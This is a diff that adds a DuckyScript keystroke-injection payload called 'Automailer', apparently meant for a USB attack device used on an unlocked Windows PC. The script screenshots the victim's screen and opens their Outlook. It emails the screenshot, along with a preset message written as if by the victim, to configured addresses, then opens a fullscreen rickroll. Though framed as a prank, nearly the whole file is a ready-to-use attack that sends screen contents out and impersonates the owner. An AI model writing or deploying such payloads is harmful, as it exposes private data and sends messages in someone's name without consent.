@@ -1,0 +1,49 @@
+REM Title:          Automailer
+REM Author:	    Ratcode404(.github.io)
+REM Description:    Snaps screen, opens outlook, sends a message to various people with pre-configured text, adds screenshot and opens up a muted 1 hour rickroll youtube video once done.
+
+REM Default Delay (350 should be mid-speed)
+DEFAULT_DELAY 350
+
+REM Take screenshot
+SHIFT WINDOWS S
+DELAY 200
+TAB
+TAB
+TAB
+TAB
+ENTER
+DELAY 300
+
+REM Open Outlook (Change E-Mail and text)
+GUI r
+DELAY 100
+STRING outlook.exe /c ipm.note /m ratcode404@notarealmail.com?v=1&cc=ratcode405@notarealmail.com
+ENTER
+DELAY 500
+STRING Subject goes here.
+TAB
+STRING Hello Ratcode!
+ENTER 
+STRING I like to leave my device unlocked and would want to invite you to some free dinner tonight.
+ENTER
+STRING xoxo
+
+REM Paste Screenshot in Mail (CTRL V)
+SHIFT INSERT
+DELAY 200
+
+REM Send Mail
+ALT S
+ENTER
+DELAY 200
+
+REM Rickroll, Mute and Fullscreen (Can adjust link obviously)
+GUI r
+DELAY 100
+STRING https://www.youtube.com/watch?v=zL19uMsnpSU
+ENTER
+DELAY 300
+M
+DELAY 200
+F
